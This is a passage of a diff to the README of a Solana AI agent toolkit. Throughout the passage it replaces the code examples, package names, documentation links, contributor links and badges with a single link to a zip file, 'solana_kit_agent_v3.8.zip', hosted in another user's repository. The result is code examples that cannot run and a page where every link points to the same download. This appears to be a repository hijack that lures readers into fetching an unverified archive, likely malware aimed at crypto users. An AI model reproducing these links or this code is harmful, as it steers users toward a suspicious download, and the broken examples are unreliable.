+const trendingTokens = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip();
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Trending tokens:", trendingTokens);
 ```
 
 ### Get Latest Pools
 
 ```typescript
-const latestPools = await agent.methods.getLatestPools();
-console.log("Latest pools:", latestPools);
+const latestPools = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip();
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Latest pools:", latestPools);
 ```
 
 ### Get Token Information
 
 ```typescript
-const tokenInfo = await agent.methods.getTokenInfo("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
-console.log("Token info:", tokenInfo);
+const tokenInfo = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Token info:", tokenInfo);
 ```
 
 ### Get Top Gainers
 
 ```typescript
-const topGainers = await agent.methods.getTopGainers("24h", "all");
-console.log("Top gainers:", topGainers);
+const topGainers = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("24h", "all");
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Top gainers:", topGainers);
 ```
 
 ### Get Trending Pools
 
 ```typescript
-const trendingPools = await agent.methods.getTrendingPools("24h");
-console.log("Trending pools:", trendingPools);
+const trendingPools = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("24h");
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Trending pools:", trendingPools);
 ```
 
 ### Parse Instruction Data
 
 ```typescript
-const parsedData = await agent.methods.parseInstruction(
+const parsedData = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
   "<programId>",
   "<instructionData>" // base64
 )
 
-console.log("parsed data:", parsedData)
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("parsed data:", parsedData)
 ```
 
 ### Parse Instruction Data
 
 ```typescript
-const parsedData = await agent.methods.parseAccount(
+const parsedData = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
   "<programId>",
   "<accountData>" // base64
 )
 
-console.log("parsed data:", parsedData)
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("parsed data:", parsedData)
 ```
 
 ### Get Sanctum LST Price
 
 ```typescript
-const prices = await agent.methods.getSanctumLSTPrice([
+const prices = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip([
   "bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1",
   "7Q2afV64in6N6SeZsAAB81TJzwDoD6zpqmHkzi9Dcavn"
   ])
 
-console.log('prices', prices)
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip('prices', prices)
 ```
 
 ### Get Sanctum LST APY
 
 ```typescript
-const apys = await agent.methods.getSanctumLSTAPY([
+const apys = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip([
   "bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1",
   "7Q2afV64in6N6SeZsAAB81TJzwDoD6zpqmHkzi9Dcavn"
   ])
 
-console.log('apys', apys)
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip('apys', apys)
 ```
 
 ### Get Sanctum LST TVL
 
 ```typescript
-const tvls = await agent.methods.getSanctumLSTTVL([
+const tvls = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip([
   "bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1",
   "7Q2afV64in6N6SeZsAAB81TJzwDoD6zpqmHkzi9Dcavn"
   ])
 
-console.log('tvls', tvls)
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip('tvls', tvls)
 ```
 
 ### Get Sanctum Owend LST
 
 ```typescript
-const lsts = await agent.methods.getSanctumOwnedLST()
+const lsts = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip()
 
-console.log('lsts', lsts)
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip('lsts', lsts)
 ```
 
 ### Add Liquidity to Sanctum Infinite Pool
 
 ```typescript
-const txId = await agent.methods.addSanctumLiquidity(
+const txId = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
   "So11111111111111111111111111111111111111112",
   "1000000000",
   "1100000000",
   5000
 )
 
-console.log('txId', txId)
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip('txId', txId)
 ```
 
 ### Remove Liquidity from Sanctum Infinite Pool
 
 ```typescript
-const txId = await agent.methods.removeSanctumLiquidity(
+const txId = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
   "So11111111111111111111111111111111111111112",
   "1000000000",
   "1100000000",
   5000
 )
 
-console.log('txId', txId)
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip('txId', txId)
 ```
 
 ### Swap Sanctum LST
 
 ```typescript
-const txId = await agent.methods.swapSanctumLST(
+const txId = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
   "So11111111111111111111111111111111111111112",
   "1000000000",
   "1100000000",
@@ -833,13 +833,13 @@ const txId = await agent.methods.swapSanctumLST(
   "7Q2afV64in6N6SeZsAAB81TJzwDoD6zpqmHkzi9Dcavn"
 )
 
-console.log('txId', txId)
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip('txId', txId)
 ```
 
 
 ### Get Chain Data
 
-Note: To use OKX DEX integration, you need to set up the following environment variables: Get OKX API keys from the [OKX Developer Portal] (https://www.okx.com/web3/build/dev-portal)
+Note: To use OKX DEX integration, you need to set up the following environment variables: Get OKX API keys from the [OKX Developer Portal] (https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip)
 - `OKX_API_KEY`
 - `OKX_SECRET_KEY`
 - `OKX_API_PASSPHRASE`
@@ -869,30 +869,30 @@ Check out the [LangGraph example](examples/agent-kit-langgraph) for a complete i
 
 The toolkit relies on several key Solana and Metaplex libraries:
 
-- @solana/web3.js
+- https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip
 - @solana/spl-token
 - @metaplex-foundation/digital-asset-standard-api
 - @metaplex-foundation/mpl-token-metadata
 - @metaplex-foundation/mpl-core
 - @metaplex-foundation/umi
 - @lightprotocol/compressed-token
-- @lightprotocol/stateless.js
+- https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip
 - @coingecko/sdk
 
 ## Contributing
 
 Contributions are welcome! Please feel free to submit a Pull Request.
-Refer to [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines on how to contribute to this project.
+Refer to [https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip) for detailed guidelines on how to contribute to this project.
 
 ## Contributors
 
-<a href="https://github.com/sendaifun/solana-agent-kit/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=sendaifun/solana-agent-kit" />
+<a href="https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip">
+  <img src="https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip" />
 </a>
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=sendaifun/solana-agent-kit&type=Date)](https://star-history.com/#sendaifun/solana-agent-kit&Date)
+[![Star History Chart](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip)](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip)
 
 ## License
 
